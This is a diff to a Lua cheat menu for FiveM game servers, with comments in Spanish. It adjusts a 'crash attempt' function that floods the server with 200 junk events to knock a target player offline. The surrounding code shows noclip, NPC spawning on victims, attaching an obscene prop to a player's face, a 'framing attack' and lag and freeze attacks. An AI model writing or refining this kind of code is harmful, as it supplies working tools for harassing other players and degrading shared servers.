@@ -110,7 +110,7 @@ local function _revivirQB()
     end
 end
 
--- Noclip (completo desde el original)
+-- Noclip (completo)
 local _noclipActivo = false
 local _noclipVel = 5.0
 local _boostMult = 3.0
@@ -506,6 +506,7 @@ local function _abrirInventario(tgt)
     Notify("~g~Intentando abrir inventario del jugador")
 end
 
+local _spawnedNPCs = {}
 local function _spawnNPCs(targetPid, cantidad)
     cantidad = cantidad or _r(3, 6)
     local targetPed = GetPlayerPed(targetPid)
@@ -636,7 +637,7 @@ local function _attachDildoToPlayer(pid)
     Notify("~p~Le has enganchado un nepe en la cara a " .. _nombreJugador(pid) .. " (persistente)")
 end
 
--- Hilos de persistencia (igual que en el original)
+-- Hilos de persistencia
 Citizen.CreateThread(function()
     while true do
         _w(1000)
@@ -751,7 +752,7 @@ local function _framingAttack(pid)
 end
 
 -- ============================================================================
---                      SERVER ATTACKS (PRUEBAS)
+--                      SERVER ATTACKS (PRUEBAS) - CORREGIDO
 -- ============================================================================
 local _lagEntidades = false
 local _lagThread = nil
@@ -808,15 +809,20 @@ local function _freezePlayer(pid)
     end
 end
 
+-- CRASH ATTEMPT CORREGIDO (sin overflow)
 local function _crashAttempt(pid)
     local targetId = GetPlayerServerId(pid)
     if not targetId then Notify("~r~No se pudo obtener Server ID") return end
     Notify("~y~Intentando crash a ".._nombreJugador(pid).." (eventos maliciosos)")
+    -- Enviar muchos eventos, pero con tamaños moderados (máx 500 caracteres)
     for i = 1, 200 do
-        TriggerServerEvent("__internal_crash_"..tostring(i), ("A"):rep(5000))
-        TriggerServerEvent("chat:addMessage", {args = {("x"):rep(1000)}})
-        TriggerServerEvent("playerSpawn", ("x"):rep(2000))
-        _w(0)
+        TriggerServerEvent("__internal_crash_"..tostring(i), string.rep("A", 500))
+        TriggerServerEvent("chat:addMessage", {args = {string.rep("x", 500)}})
+        -- playerSpawn es muy sensible, lo enviamos con tamaño seguro (250)
+        if i % 10 == 0 then
+            TriggerServerEvent("playerSpawn", string.rep("x", 250))
+        end
+        Citizen.Wait(0)
     end
     Notify("~r~Ataque de eventos completado. Si el jugador se desconecta, el servidor es vulnerable.")
 end
@@ -1091,10 +1097,8 @@ RegisterMenuModule("server_attacks", {
 -- ============================================================================
 --                MENÚS DINÁMICOS (vehicle_list, player_list y submenús)
 -- ============================================================================
--- Almacenes para submenús dinámicos de vehículos y jugadores
 local dynamicSubmenus = {}
 
--- Refresca la lista de vehículos y crea submenús para cada uno
 local function refreshVehicleList()
     local vehs = _vehiculosCercanos()
     local opts = {}
@@ -1127,7 +1131,6 @@ local function refreshVehicleList()
     RegisterMenuModule("vehicle_list", opts)
 end
 
--- Refresca la lista de jugadores y crea submenús para cada uno
 local function refreshPlayerList()
     local players = _listaJugadores()
     local opts = {}
@@ -1159,7 +1162,7 @@ local function refreshPlayerList()
     RegisterMenuModule("player_list", opts)
 end
 
--- Actualización periódica de las listas dinámicas (cada 2 segundos)
+-- Actualización periódica de listas dinámicas
 Citizen.CreateThread(function()
     while true do
         _w(2000)
@@ -1168,7 +1171,6 @@ Citizen.CreateThread(function()
     end
 end)
 
--- Inicializar listas al arrancar
 refreshVehicleList()
 refreshPlayerList()
 
